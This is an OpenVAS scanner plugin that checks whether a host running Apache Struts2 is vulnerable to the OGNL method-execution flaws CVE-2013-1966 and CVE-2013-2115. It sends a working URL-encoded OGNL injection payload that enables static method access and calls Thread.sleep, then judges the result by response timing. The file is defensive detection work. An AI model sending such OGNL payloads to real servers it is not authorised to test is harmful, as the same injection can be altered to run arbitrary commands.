###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts2_java_method_exec_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Apache Struts2 'URL' & 'Anchor' tags Arbitrary Java Method Execution Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803837");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2013-1966", "CVE-2013-2115");
  script_bugtraq_id(60166, 60167);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2013-07-23 17:54:59 +0530 (Tue, 23 Jul 2013)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Apache Struts2 'URL' & 'Anchor' tags Arbitrary Java Method Execution Vulnerabilities");

  script_tag(name:"summary", value:"This host is running Apache Struts2 and
  is prone to arbitrary java method execution vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data like system functions
  via HTTP POST request and check whether it is executing the java function or not.");

  script_tag(name:"insight", value:"Flaw is due to improper handling of the
  includeParams attribute in the URL and Anchor tags");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to execute arbitrary commands via specially crafted OGNL (Object-Graph Navigation Language)
  expressions.");

  script_tag(name:"affected", value:"Apache Struts 2 before 2.3.14.2");

  script_tag(name:"solution", value:"Upgrade to Apache Struts 2 version 2.3.14.2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53553");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25980");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-013");
  script_xref(name:"URL", value:"http://struts.apache.org/development/2.x/docs/s2-014.html");
  script_xref(name:"URL", value:"http://metasploit.org/modules/exploit/multi/http/struts_include_params");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_apache_struts2_detection.nasl");
  script_mandatory_keys("ApacheStruts/installed");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!asport = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:asport)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:asport);

asreq = http_get(item:string(dir,"/example/HelloWorld.action"), port:asport);
asres = http_keepalive_send_recv(port:asport, data:asreq);

if(asres && ">Struts" >< asres && ">English<" >< asres)
{
  sleep = make_list(3, 5);

  foreach i (sleep)
  {
    postdata = "fgoa=%24%7b%23%5fmemberAccess%5b%22allow"+
               "StaticMethodAccess%22%5d%3dtrue%2c%40jav"+
                 "a.lang.Thread%40sleep%28"+ i +"000%29%7d";

      asReq = string("POST /struts2-blank/example/HelloWorld.action HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "User-Agent: ", useragent, "\r\n",
                     "Content-Type: application/x-www-form-urlencoded\r\n",
                     "Content-Length: ", strlen(postdata), "\r\n",
                     "\r\n", postdata);

      start = unixtime();
      asRes = http_send_recv(port:asport, data:asReq);
      stop = unixtime();

      if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable
    }
    security_message(port:asport);
    exit(0);
}